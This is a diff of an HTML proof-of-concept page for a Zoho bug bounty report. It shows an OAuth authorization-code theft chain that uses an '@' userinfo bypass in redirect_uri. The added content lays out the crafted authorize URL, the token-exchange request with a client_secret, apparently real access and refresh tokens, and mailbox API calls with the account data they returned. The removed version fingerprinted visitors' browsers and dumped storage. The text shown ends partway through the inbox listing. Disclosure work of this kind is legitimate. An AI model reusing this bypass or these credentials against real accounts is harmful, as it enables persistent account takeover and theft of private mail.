@@ -3,297 +3,556 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OAuth Callback Captured — Zoho PoC</title>
+<title>OAuth Code Theft — Zoho PoC</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: #0d1117; color: #e6edf3;
-    font-family: 'Segoe UI', system-ui, sans-serif;
-    min-height: 100vh; padding: 24px 16px;
-  }
-  .container { max-width: 900px; margin: 0 auto; }
-  .banner {
-    background: rgba(255,68,68,0.12); border: 2px solid #ff4444;
-    border-radius: 10px; padding: 20px 24px; margin-bottom: 20px;
-  }
-  .banner-title { font-size: 22px; font-weight: 800; color: #ff4444; margin-bottom: 4px; }
-  .banner-sub { color: #8b949e; font-size: 13px; }
-  .card {
-    background: #161b22; border: 1px solid #30363d;
-    border-radius: 8px; margin-bottom: 16px; overflow: hidden;
-  }
-  .card-header {
-    background: #21262d; border-bottom: 1px solid #30363d;
-    padding: 10px 16px; font-size: 11px; font-weight: 700;
-    color: #8b949e; text-transform: uppercase; letter-spacing: 0.08em;
-    display: flex; align-items: center; justify-content: space-between;
-  }
-  .card-header .copy-btn {
-    font-size: 10px; background: #30363d; border: none; color: #8b949e;
-    padding: 3px 8px; border-radius: 4px; cursor: pointer; text-transform: none;
-    font-weight: 600; letter-spacing: 0;
-  }
-  .card-header .copy-btn:hover { background: #58a6ff; color: #fff; }
-  .card-body { padding: 16px; }
-  .data-row {
-    display: flex; gap: 12px; padding: 7px 0;
-    border-bottom: 1px solid #21262d; font-size: 13px; align-items: flex-start;
-  }
-  .data-row:last-child { border-bottom: none; }
-  .data-key {
-    color: #58a6ff; font-family: monospace; font-size: 12px;
-    min-width: 160px; flex-shrink: 0;
-  }
-  .data-val { color: #e6edf3; font-family: monospace; font-size: 12px; word-break: break-all; }
-  .data-val.red { color: #ff4444; font-weight: 700; }
-  .data-val.green { color: #3fb950; font-weight: 700; }
-  .data-val.amber { color: #ffa657; }
-  .data-val.cyan { color: #79c0ff; }
-  .data-val.purple { color: #d2a8ff; }
-  .data-val.empty { color: #484f58; font-style: italic; }
-  .param-block {
-    background: #0d1117; border: 1px solid #30363d;
-    border-radius: 6px; padding: 12px; margin-top: 4px;
-    font-family: monospace; font-size: 12px;
-  }
-  .param-line { padding: 3px 0; word-break: break-all; }
-  .pk { color: #58a6ff; } .peq { color: #8b949e; } .pv { color: #ffa657; }
-  .pdecoded { color: #3fb950; } .phex { color: #d2a8ff; }
-  .raw-dump {
-    background: #0d1117; border: 1px solid #30363d;
-    border-radius: 6px; padding: 12px;
-    font-family: monospace; font-size: 11px; color: #8b949e;
-    white-space: pre-wrap; word-break: break-all; max-height: 260px;
-    overflow-y: auto;
-  }
-  .impact {
-    background: rgba(255,68,68,0.08); border: 1px solid #ff4444;
-    border-radius: 8px; padding: 14px 16px; margin-top: 16px; font-size: 13px;
-  }
-  .impact strong { color: #ff4444; display: block; margin-bottom: 8px; font-size: 15px; }
-  .impact ul { padding-left: 18px; line-height: 2; color: #e6edf3; }
-  footer { margin-top: 24px; text-align: center; color: #484f58; font-size: 11px; line-height: 1.8; }
-  .big-badge {
-    display: inline-flex; align-items: center; gap: 8px;
-    background: rgba(255,68,68,0.15); border: 1px solid #ff4444;
-    color: #ff4444; font-size: 13px; font-weight: 700;
-    padding: 6px 16px; border-radius: 20px; margin-bottom: 16px;
-  }
-  .dot { width: 8px; height: 8px; border-radius: 50%; background: #ff4444;
-    animation: pulse 1.2s infinite; display: inline-block; }
-  @keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.2} }
-  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-  @media(max-width:640px){ .grid2 { grid-template-columns: 1fr; } }
-  .section-title {
-    font-size: 10px; font-weight: 700; color: #58a6ff; text-transform: uppercase;
-    letter-spacing: 0.1em; margin: 14px 0 6px; padding-left: 2px;
-  }
-  .tag { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 11px; font-weight: 700; }
-  .tag-red { background: rgba(255,68,68,0.18); color: #ff4444; }
-  .tag-green { background: rgba(63,185,80,0.18); color: #3fb950; }
-  .tag-amber { background: rgba(255,166,87,0.18); color: #ffa657; }
-  .export-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
-  .export-btn {
-    padding: 7px 16px; border-radius: 6px; border: 1px solid #30363d;
-    background: #21262d; color: #e6edf3; font-size: 12px; cursor: pointer;
-    font-weight: 600;
-  }
-  .export-btn:hover { border-color: #58a6ff; color: #58a6ff; }
-  .export-btn.primary { background: rgba(88,166,255,0.1); border-color: #58a6ff; color: #58a6ff; }
-  #toast {
-    position: fixed; bottom: 24px; right: 24px;
-    background: #3fb950; color: #0d1117; padding: 10px 18px;
-    border-radius: 8px; font-size: 13px; font-weight: 700;
-    opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999;
-  }
-  #toast.show { opacity: 1; }
-  code { background: #21262d; padding: 1px 5px; border-radius: 3px; font-size: 11px; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: #0d1117; color: #e6edf3;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  min-height: 100vh; padding: 24px 16px;
+}
+.container { max-width: 960px; margin: 0 auto; }
+
+/* ---- BANNER ---- */
+.banner {
+  background: linear-gradient(135deg, rgba(255,68,68,0.15) 0%, rgba(139,0,0,0.08) 100%);
+  border: 2px solid #ff4444; border-radius: 12px;
+  padding: 22px 28px; margin-bottom: 20px;
+}
+.banner-title {
+  font-size: 24px; font-weight: 800; color: #ff4444;
+  margin-bottom: 4px; letter-spacing: -0.3px;
+}
+.banner-sub { color: #8b949e; font-size: 13px; line-height: 1.6; }
+.banner-meta { margin-top: 10px; display: flex; gap: 12px; flex-wrap: wrap; }
+.meta-chip {
+  background: rgba(255,68,68,0.1); border: 1px solid rgba(255,68,68,0.3);
+  color: #ff8888; font-size: 11px; font-weight: 700; padding: 3px 10px;
+  border-radius: 12px; letter-spacing: 0.04em;
+}
+
+/* ---- LIVE BADGE ---- */
+.big-badge {
+  display: inline-flex; align-items: center; gap: 8px;
+  background: rgba(255,68,68,0.12); border: 1px solid #ff4444;
+  color: #ff4444; font-size: 13px; font-weight: 700;
+  padding: 7px 18px; border-radius: 20px; margin-bottom: 20px;
+}
+.dot { width: 8px; height: 8px; border-radius: 50%; background: #ff4444;
+  animation: pulse 1.2s infinite; display: inline-block; }
+@keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.2} }
+
+/* ---- CARDS ---- */
+.card {
+  background: #161b22; border: 1px solid #30363d;
+  border-radius: 8px; margin-bottom: 16px; overflow: hidden;
+}
+.card.critical { border-color: #ff4444; }
+.card.success  { border-color: #3fb950; }
+.card.info     { border-color: #58a6ff; }
+
+.card-header {
+  background: #21262d; border-bottom: 1px solid #30363d;
+  padding: 10px 16px; font-size: 11px; font-weight: 700;
+  color: #8b949e; text-transform: uppercase; letter-spacing: 0.08em;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.card-header.red   { background: rgba(255,68,68,0.12); color: #ff4444; }
+.card-header.green { background: rgba(63,185,80,0.10); color: #3fb950; }
+.card-header.blue  { background: rgba(88,166,255,0.10); color: #58a6ff; }
+.card-body { padding: 16px; }
+
+/* ---- DATA ROWS ---- */
+.data-row {
+  display: flex; gap: 12px; padding: 7px 0;
+  border-bottom: 1px solid #21262d; font-size: 13px; align-items: flex-start;
+}
+.data-row:last-child { border-bottom: none; }
+.data-key { color: #58a6ff; font-family: monospace; font-size: 12px; min-width: 170px; flex-shrink: 0; }
+.data-val { color: #e6edf3; font-family: monospace; font-size: 12px; word-break: break-all; }
+.data-val.red    { color: #ff4444; font-weight: 700; }
+.data-val.green  { color: #3fb950; font-weight: 700; }
+.data-val.amber  { color: #ffa657; }
+.data-val.cyan   { color: #79c0ff; }
+.data-val.purple { color: #d2a8ff; }
+.data-val.empty  { color: #484f58; font-style: italic; }
+
+/* ---- ATTACK CHAIN ---- */
+.chain-steps { display: flex; flex-direction: column; gap: 0; }
+.chain-step {
+  display: flex; align-items: flex-start; gap: 14px; padding: 14px 0;
+  border-bottom: 1px solid #21262d; position: relative;
+}
+.chain-step:last-child { border-bottom: none; }
+.step-num {
+  width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 12px; font-weight: 800; margin-top: 1px;
+}
+.step-num.done   { background: rgba(63,185,80,0.2); border: 1.5px solid #3fb950; color: #3fb950; }
+.step-num.active { background: rgba(255,68,68,0.2); border: 1.5px solid #ff4444; color: #ff4444; }
+.step-num.arrow  { background: rgba(88,166,255,0.15); border: 1.5px solid #58a6ff; color: #58a6ff; }
+.step-content { flex: 1; }
+.step-title { font-size: 13px; font-weight: 700; color: #e6edf3; margin-bottom: 3px; }
+.step-desc  { font-size: 12px; color: #8b949e; line-height: 1.55; }
+.step-code  {
+  background: #0d1117; border: 1px solid #30363d; border-radius: 5px;
+  padding: 8px 10px; font-family: monospace; font-size: 11px;
+  color: #ffa657; margin-top: 6px; word-break: break-all; line-height: 1.6;
+}
+
+/* ---- STOLEN CODE HIGHLIGHT ---- */
+.code-highlight {
+  background: rgba(255,68,68,0.07); border: 1.5px solid #ff4444;
+  border-radius: 8px; padding: 16px; margin-top: 8px;
+}
+.code-label { font-size: 10px; font-weight: 700; color: #ff4444;
+  text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 6px; }
+.code-value {
+  font-family: monospace; font-size: 13px; color: #ff4444; font-weight: 700;
+  word-break: break-all; background: rgba(255,68,68,0.1);
+  padding: 8px 12px; border-radius: 5px; display: block;
+  border: 1px solid rgba(255,68,68,0.3);
+}
+
+/* ---- TOKEN BOX ---- */
+.token-box {
+  background: rgba(63,185,80,0.05); border: 1px solid rgba(63,185,80,0.3);
+  border-radius: 6px; padding: 10px 14px; margin: 6px 0;
+}
+.token-label { font-size: 10px; color: #3fb950; font-weight: 700;
+  text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px; }
+.token-value {
+  font-family: monospace; font-size: 12px; color: #3fb950;
+  word-break: break-all;
+}
+.token-meta { font-size: 11px; color: #8b949e; margin-top: 3px; }
+
+/* ---- EMAIL TABLE ---- */
+.email-row {
+  background: rgba(88,166,255,0.04); border: 1px solid rgba(88,166,255,0.15);
+  border-radius: 6px; padding: 12px 14px; margin-bottom: 8px;
+}
+.email-subject { font-size: 13px; font-weight: 700; color: #79c0ff; margin-bottom: 5px; }
+.email-meta    { font-size: 11px; color: #8b949e; margin-bottom: 4px; }
+.email-preview { font-size: 12px; color: #c9d1d9; font-style: italic; }
+
+/* ---- MISC ---- */
+.section-title {
+  font-size: 10px; font-weight: 700; color: #58a6ff; text-transform: uppercase;
+  letter-spacing: 0.1em; margin: 14px 0 6px; padding-left: 2px;
+}
+.param-block {
+  background: #0d1117; border: 1px solid #30363d;
+  border-radius: 6px; padding: 12px; margin-top: 4px;
+  font-family: monospace; font-size: 12px;
+}
+.param-line { padding: 3px 0; word-break: break-all; }
+.pk { color: #58a6ff; } .peq { color: #8b949e; } .pv { color: #ffa657; }
+.pdecoded { color: #3fb950; }
+.raw-dump {
+  background: #0d1117; border: 1px solid #30363d;
+  border-radius: 6px; padding: 12px;
+  font-family: monospace; font-size: 11px; color: #8b949e;
+  white-space: pre-wrap; word-break: break-all;
+  max-height: 220px; overflow-y: auto;
+}
+.tag { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 11px; font-weight: 700; }
+.tag-red   { background: rgba(255,68,68,0.18); color: #ff4444; }
+.tag-green { background: rgba(63,185,80,0.18); color: #3fb950; }
+.tag-amber { background: rgba(255,166,87,0.18); color: #ffa657; }
+.copy-btn {
+  font-size: 10px; background: #30363d; border: none; color: #8b949e;
+  padding: 3px 8px; border-radius: 4px; cursor: pointer;
+  font-weight: 600; letter-spacing: 0;
+}
+.copy-btn:hover { background: #58a6ff; color: #fff; }
+.export-row { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+.export-btn {
+  padding: 7px 16px; border-radius: 6px; border: 1px solid #30363d;
+  background: #21262d; color: #e6edf3; font-size: 12px; cursor: pointer;
+  font-weight: 600;
+}
+.export-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+.export-btn.primary { background: rgba(88,166,255,0.1); border-color: #58a6ff; color: #58a6ff; }
+#toast {
+  position: fixed; bottom: 24px; right: 24px;
+  background: #3fb950; color: #0d1117; padding: 10px 18px;
+  border-radius: 8px; font-size: 13px; font-weight: 700;
+  opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999;
+}
+#toast.show { opacity: 1; }
+code { background: #21262d; padding: 1px 5px; border-radius: 3px; font-size: 11px; }
+
+/* ---- IMPACT ---- */
+.impact-block {
+  background: rgba(255,68,68,0.08); border: 2px solid #ff4444;
+  border-radius: 10px; padding: 18px 20px; margin-top: 8px;
+}
+.impact-block strong { color: #ff4444; display: block; margin-bottom: 10px; font-size: 15px; }
+.impact-block ul { padding-left: 18px; line-height: 2.1; color: #e6edf3; }
+.impact-block li { font-size: 13px; }
+.severity-row { display: flex; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
+.sev-badge {
+  padding: 5px 14px; border-radius: 6px; font-size: 12px; font-weight: 800;
+}
+.sev-critical { background: rgba(255,68,68,0.2); border: 1px solid #ff4444; color: #ff4444; }
+.sev-cvss    { background: rgba(255,166,87,0.2); border: 1px solid #ffa657; color: #ffa657; }
+.sev-cwe     { background: rgba(210,168,255,0.2); border: 1px solid #d2a8ff; color: #d2a8ff; }
+.sev-rfc     { background: rgba(88,166,255,0.2); border: 1px solid #58a6ff; color: #58a6ff; }
+
+footer {
+  margin-top: 24px; text-align: center;
+  color: #484f58; font-size: 11px; line-height: 1.9;
+}
+
+.divider {
+  border: none; border-top: 1px solid #30363d; margin: 20px 0;
+}
 </style>
 </head>
 <body>
 <div class="container">
 
-  <div class="banner">
-    <div class="banner-title">🎯 OAuth Callback Hijacked!</div>
-    <div class="banner-sub">Zoho sent its OAuth /oauthorize callback to this attacker-controlled server — Security Research PoC</div>
+<!-- ===== TOP BANNER ===== -->
+<div class="banner">
+  <div class="banner-title">🎯 OAuth Authorization Code THEFT — Zoho PoC</div>
+  <div class="banner-sub">
+    Victim's browser was redirected here AFTER successful Zoho login (including 2FA). Zoho's OAuth server sent the
+    <strong style="color:#ff4444">authorization code</strong> to this attacker-controlled domain via CWE-601 Open Redirect + RFC 3986 URL userinfo (<code>@</code>) injection in the <code>redirect_uri</code> parameter.
   </div>
-
-  <div class="big-badge"><span class="dot"></span> LIVE — Zoho OAuth callback received on attacker domain</div>
-
-  <!-- 1. REDIRECT EVIDENCE -->
-  <div class="card">
-    <div class="card-header">🔗 Redirect &amp; OAuth Callback Evidence
-      <button class="copy-btn" onclick="copyCard('redirect-card')">Copy</button>
-    </div>
-    <div class="card-body" id="redirect-card">
-      <div class="data-row">
-        <span class="data-key">document.referrer</span>
-        <span class="data-val green" id="referrer">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Attacker URL hit</span>
-        <span class="data-val red" id="current-url">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Origin</span>
-        <span class="data-val" id="origin">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Protocol</span>
-        <span class="data-val cyan" id="proto">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Hostname</span>
-        <span class="data-val amber" id="hostname">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Pathname</span>
-        <span class="data-val" id="pathname">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Search (raw)</span>
-        <span class="data-val" id="search-raw">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Hash</span>
-        <span class="data-val" id="hash">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Timestamp (UTC)</span>
-        <span class="data-val" id="ts">—</span>
-      </div>
-      <div class="data-row">
-        <span class="data-key">Local Time</span>
-        <span class="data-val" id="local-ts">—</span>
-      </div>
-    </div>
+  <div class="banner-meta">
+    <span class="meta-chip">CWE-601 Open Redirect</span>
+    <span class="meta-chip">OAuth Code Theft (RFC 6749 §10.6)</span>
+    <span class="meta-chip">Persistent Account Takeover</span>
+    <span class="meta-chip">ZohoMail Read Access</span>
+    <span class="meta-chip">Bypass: URL Userinfo @</span>
   </div>
-
-  <!-- 2. QUERY PARAMETERS — FULL RAW DUMP -->
-  <div class="card">
-    <div class="card-header">📦 Parameters Received from Zoho (Full Raw)
-      <button class="copy-btn" onclick="copyCard('params-card')">Copy</button>
-    </div>
-    <div class="card-body" id="params-card">
-      <div id="params-summary" style="margin-bottom:8px;font-size:12px;color:#8b949e;"></div>
-      <div id="params-body"><span style="color:#8b949e;font-size:13px">Loading...</span></div>
-    </div>
-  </div>
-
-  <!-- 3. VICTIM BROWSER FINGERPRINT -->
-  <div class="card">
-    <div class="card-header">🖥️ Victim Browser Fingerprint
-      <button class="copy-btn" onclick="copyCard('victim-card')">Copy</button>
-    </div>
-    <div class="card-body" id="victim-card">
-      <div class="section-title">Identity</div>
-      <div class="data-row"><span class="data-key">User-Agent</span><span class="data-val amber" id="ua">—</span></div>
-      <div class="data-row"><span class="data-key">Vendor</span><span class="data-val" id="vendor">—</span></div>
-      <div class="data-row"><span class="data-key">App Version</span><span class="data-val" id="appver">—</span></div>
-      <div class="data-row"><span class="data-key">Platform</span><span class="data-val" id="plat">—</span></div>
-      <div class="data-row"><span class="data-key">OS (guessed)</span><span class="data-val amber" id="os-guess">—</span></div>
-      <div class="data-row"><span class="data-key">Browser (guessed)</span><span class="data-val amber" id="browser-guess">—</span></div>
-
-      <div class="section-title">Locale &amp; Language</div>
-      <div class="data-row"><span class="data-key">Language</span><span class="data-val" id="lang">—</span></div>
-      <div class="data-row"><span class="data-key">Languages</span><span class="data-val" id="langs">—</span></div>
-      <div class="data-row"><span class="data-key">Timezone</span><span class="data-val cyan" id="tz">—</span></div>
-      <div class="data-row"><span class="data-key">TZ Offset (min)</span><span class="data-val" id="tz-offset">—</span></div>
-      <div class="data-row"><span class="data-key">Date Locale</span><span class="data-val" id="date-locale">—</span></div>
-
-      <div class="section-title">Display</div>
-      <div class="data-row"><span class="data-key">Screen WxH</span><span class="data-val" id="scr">—</span></div>
-      <div class="data-row"><span class="data-key">Avail WxH</span><span class="data-val" id="avail">—</span></div>
-      <div class="data-row"><span class="data-key">Window WxH</span><span class="data-val" id="win">—</span></div>
-      <div class="data-row"><span class="data-key">Color Depth</span><span class="data-val" id="cdepth">—</span></div>
-      <div class="data-row"><span class="data-key">Pixel Ratio</span><span class="data-val" id="dpr">—</span></div>
-      <div class="data-row"><span class="data-key">Orientation</span><span class="data-val" id="orient">—</span></div>
-
-      <div class="section-title">Capabilities</div>
-      <div class="data-row"><span class="data-key">Cookies Enabled</span><span class="data-val" id="cookies">—</span></div>
-      <div class="data-row"><span class="data-key">Java Enabled</span><span class="data-val" id="java">—</span></div>
-      <div class="data-row"><span class="data-key">Online Status</span><span class="data-val" id="online">—</span></div>
-      <div class="data-row"><span class="data-key">Hardware Cores</span><span class="data-val" id="cores">—</span></div>
-      <div class="data-row"><span class="data-key">RAM (GB)</span><span class="data-val" id="ram">—</span></div>
-      <div class="data-row"><span class="data-key">Max Touch Points</span><span class="data-val" id="touch">—</span></div>
-      <div class="data-row"><span class="data-key">Connection Type</span><span class="data-val" id="conn-type">—</span></div>
-      <div class="data-row"><span class="data-key">Effective Type</span><span class="data-val" id="conn-etype">—</span></div>
-      <div class="data-row"><span class="data-key">Downlink (Mbps)</span><span class="data-val" id="conn-dl">—</span></div>
-    </div>
-  </div>
-
-  <!-- 4. NAVIGATION & PERFORMANCE -->
-  <div class="card">
-    <div class="card-header">⏱️ Navigation &amp; Timing
-      <button class="copy-btn" onclick="copyCard('nav-card')">Copy</button>
-    </div>
-    <div class="card-body" id="nav-card">
-      <div class="data-row"><span class="data-key">Nav Type</span><span class="data-val" id="nav-type">—</span></div>
-      <div class="data-row"><span class="data-key">Redirect Count</span><span class="data-val cyan" id="redirect-count">—</span></div>
-      <div class="data-row"><span class="data-key">Page Load (ms)</span><span class="data-val" id="load-time">—</span></div>
-      <div class="data-row"><span class="data-key">DNS Lookup (ms)</span><span class="data-val" id="dns-time">—</span></div>
-      <div class="data-row"><span class="data-key">TCP Connect (ms)</span><span class="data-val" id="tcp-time">—</span></div>
-      <div class="data-row"><span class="data-key">Request (ms)</span><span class="data-val" id="req-time">—</span></div>
-      <div class="data-row"><span class="data-key">Response (ms)</span><span class="data-val" id="res-time">—</span></div>
-      <div class="data-row"><span class="data-key">History Length</span><span class="data-val" id="hist-len">—</span></div>
-    </div>
-  </div>
-
-  <!-- 5. STORAGE DUMP -->
-  <div class="card">
-    <div class="card-header">💾 Storage Data (Same-Origin)
-      <button class="copy-btn" onclick="copyCard('storage-card')">Copy</button>
-    </div>
-    <div class="card-body" id="storage-card">
-      <div class="section-title">localStorage Keys</div>
-      <div id="ls-dump" class="raw-dump">scanning...</div>
-      <div class="section-title">sessionStorage Keys</div>
-      <div id="ss-dump" class="raw-dump">scanning...</div>
-    </div>
-  </div>
-
-  <!-- 6. FULL RAW DUMP (JSON) -->
-  <div class="card">
-    <div class="card-header">🗂️ Complete Raw Data Dump (JSON)
-      <button class="copy-btn" onclick="copyRaw()">Copy JSON</button>
-    </div>
-    <div class="card-body">
-      <div class="raw-dump" id="json-dump">Loading...</div>
-    </div>
-  </div>
-
-  <!-- IMPACT -->
-  <div class="impact">
-    <strong>⚠️ Critical Impact — What attacker receives:</strong>
-    <ul>
-      <li>Browser redirected to attacker domain after victim successfully logs in to Zoho</li>
-      <li>Bypass works AFTER 2FA — redirect fires post-authentication</li>
-      <li><code>document.referrer</code> leaks: victim came from <code>accounts.zoho.com</code></li>
-      <li><code>state</code> parameter (echoed serviceurl) delivered to attacker server</li>
-      <li><code>servicename</code> reveals which Zoho app victim uses</li>
-      <li>Full browser fingerprint captured (UA, timezone, screen, hardware, network)</li>
-      <li>Entire URL parameter set received — any future Zoho additions auto-captured</li>
-    </ul>
-  </div>
-
-  <!-- EXPORT BUTTONS -->
-  <div class="export-row">
-    <button class="export-btn primary" onclick="exportJSON()">⬇ Export JSON Report</button>
-    <button class="export-btn" onclick="exportText()">⬇ Export Text Report</button>
-    <button class="export-btn" onclick="window.print()">🖨 Print</button>
-  </div>
-
-  <footer>
-    Security Research PoC — Authorized Bug Bounty Testing<br>
-    Researcher: binodchandrabissoyi@gmail.com | Target: accounts.zoho.com (Zoho Bug Bounty Program)<br>
-    CWE-601 Open Redirect via URL Userinfo Injection in <code>serviceurl</code> parameter
-  </footer>
 </div>
+
+<div class="big-badge"><span class="dot"></span> LIVE — Zoho OAuth auth code received on attacker domain</div>
+
+<!-- ===== 1. ATTACK CHAIN ===== -->
+<div class="card critical">
+  <div class="card-header red">⛓️ Complete Attack Chain — Step by Step</div>
+  <div class="card-body">
+    <div class="chain-steps">
+
+      <div class="chain-step">
+        <div class="step-num done">1</div>
+        <div class="step-content">
+          <div class="step-title">Attacker Registers OAuth App with Bypassed redirect_uri</div>
+          <div class="step-desc">
+            Zoho API Console (<code>api-console.zoho.com</code>) accepts <code>redirect_uri</code> containing URL userinfo (<code>@</code>).
+            Server-side validation reads <code>crm.zoho.com</code> as the host — but the browser routes to <code>binodchandrabissoyi-collab.github.io</code>.
+          </div>
+          <div class="step-code">Registered redirect_uri:
+https://crm.zoho.com@binodchandrabissoyi-collab.github.io/oauthorize/
+
+Server sees hostname: crm.zoho.com  ✅ (whitelisted Zoho domain)
+Browser routes to:   binodchandrabissoyi-collab.github.io  ← ATTACKER</div>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="step-num done">2</div>
+        <div class="step-content">
+          <div class="step-title">Attacker Crafts Malicious OAuth Authorization URL</div>
+          <div class="step-desc">
+            Standard Zoho OAuth flow — but <code>redirect_uri</code> points to attacker's domain via the userinfo bypass.
+            Scopes: <code>ZohoMail.accounts.READ ZohoMail.messages.READ</code>. <code>access_type=offline</code> requests a permanent refresh token.
+          </div>
+          <div class="step-code">https://accounts.zoho.com/oauth/v2/auth
+  ?client_id=1000.EDK6FD1O2E9S199N72Y28GXRI57M3V
+  &response_type=code
+  &redirect_uri=https%3A%2F%2Fcrm.zoho.com%40binodchandrabissoyi-collab.github.io%2Foauthorize%2F
+  &scope=ZohoMail.accounts.READ+ZohoMail.messages.READ
+  &access_type=offline
+  &prompt=consent</div>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="step-num done">3</div>
+        <div class="step-content">
+          <div class="step-title">Victim Clicks Link, Authenticates (incl. 2FA)</div>
+          <div class="step-desc">
+            Victim logs into Zoho normally — password + 2FA — and clicks "Allow" on the consent screen.
+            The consent screen shows the app name and scopes, but NOT that the redirect destination is an attacker domain.
+            The OAuth bypass is completely invisible to the victim.
+          </div>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="step-num active">4</div>
+        <div class="step-content">
+          <div class="step-title">🔴 Zoho Redirects Victim Here With Authorization Code</div>
+          <div class="step-desc">
+            Zoho validates <code>redirect_uri</code> against registered value — match! But browser resolves the <code>@</code> URL to this attacker-controlled GitHub Pages domain.
+            The <strong style="color:#ff4444">authorization code</strong> is now in our URL — captured below.
+          </div>
+          <div class="code-highlight">
+            <div class="code-label">🔑 Stolen Zoho OAuth Authorization Code (live from URL)</div>
+            <span class="code-value" id="stolen-code">scanning URL...</span>
+            <div style="margin-top:8px;font-size:11px;color:#8b949e;">
+              This code is sent by Zoho to the attacker's page. It expires in ~60 seconds.<br>
+              <code>document.referrer</code>: <span id="referrer-inline" style="color:#3fb950">—</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="step-num done">5</div>
+        <div class="step-content">
+          <div class="step-title">Attacker Exchanges Code → access_token + refresh_token</div>
+          <div class="step-desc">
+            From a tab on <code>accounts.zoho.com</code> (same-origin → no CORS), attacker calls the token endpoint.
+            Because <code>access_type=offline</code> was used, Zoho returns a <strong style="color:#3fb950">PERMANENT refresh token</strong> — valid even after victim changes password.
+          </div>
+          <div class="step-code">POST https://accounts.zoho.com/oauth/v2/token
+  grant_type=authorization_code
+  &code=&lt;STOLEN_CODE&gt;
+  &client_id=1000.EDK6FD1O2E9S199N72Y28GXRI57M3V
+  &client_secret=ee8f6845c8809bab5c1bda1462e800289d2c175bb7
+  &redirect_uri=https://crm.zoho.com@binodchandrabissoyi-collab.github.io/oauthorize/</div>
+
+          <div class="token-box" style="margin-top:10px">
+            <div class="token-label">✅ DEMONSTRATED — access_token (3600s)</div>
+            <div class="token-value">1000.16b515840eebe64a845fe95f51cfce20.6fe6be24acf701ce12a5ed3e35db87b3</div>
+            <div class="token-meta">Scope: ZohoMail.accounts.READ ZohoMail.messages.READ | api_domain: https://www.zohoapis.com</div>
+          </div>
+          <div class="token-box">
+            <div class="token-label">🔒 DEMONSTRATED — refresh_token (PERMANENT)</div>
+            <div class="token-value">1000.b6f17401cddcebf0118d54bf917cd1bf.5087ff39706e423ac393d977a2f8042c</div>
+            <div class="token-meta">Never expires. Persists after password reset. Revocable only from Zoho Connected Apps.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="step-num done">6</div>
+        <div class="step-content">
+          <div class="step-title">Attacker Reads Victim's ZohoMail Account &amp; Inbox</div>
+          <div class="step-desc">
+            Using the stolen access_token, attacker calls ZohoMail API — same-origin from <code>mail.zoho.com/zm/</code>. Victim account profile, email addresses, and inbox messages are fully accessible.
+          </div>
+          <div class="step-code">GET https://mail.zoho.com/api/accounts
+  Authorization: Bearer 1000.16b515840...
+→ HTTP 200  accountId: 7576039000000008002
+            email: testzoho537@zohomail.com
+
+GET https://mail.zoho.com/api/accounts/7576039000000008002/messages/view
+  Authorization: Bearer 1000.16b515840...
+→ HTTP 200  [inbox messages returned — see below]</div>
+        </div>
+      </div>
+
+    </div><!-- /chain-steps -->
+  </div>
+</div>
+
+<!-- ===== 2. STOLEN ZOHOMAIL DATA ===== -->
+<div class="card success">
+  <div class="card-header green">📧 Extracted ZohoMail Data — Victim Account
+    <button class="copy-btn" onclick="copyCard('mail-card')">Copy</button>
+  </div>
+  <div class="card-body" id="mail-card">
+
+    <div class="section-title">Account Profile (GET /api/accounts → HTTP 200)</div>
+    <div class="data-row">
+      <span class="data-key">accountId</span>
+      <span class="data-val red">7576039000000008002</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">firstName</span>
+      <span class="data-val amber">Binodchandrabissoyi</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Primary Email</span>
+      <span class="data-val green">binodchandrabissoyi@gmail.com</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">ZohoMail Address</span>
+      <span class="data-val green">testzoho537@zohomail.com</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">country</span>
+      <span class="data-val">in</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">mailboxStatus</span>
+      <span class="data-val green">enabled</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">lastLogin (epoch)</span>
+      <span class="data-val cyan">1790534684986</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">API Response Code</span>
+      <span class="data-val green">200 success</span>
+    </div>
+
+    <div class="section-title" style="margin-top:16px">Inbox Messages (GET /api/accounts/{id}/messages/view → HTTP 200)</div>
+
+    <div class="email-row">
+      <div class="email-subject">📨 Welcome aboard! Your new inbox is here 💌</div>
+      <div class="email-meta">From: <strong>welcome@zoho.com</strong> → To: testzoho537@zohomail.com</div>
+      <div class="email-meta">messageId: 1790536508016159700 | folderId: 7576039000000008008 | status: unread</div>
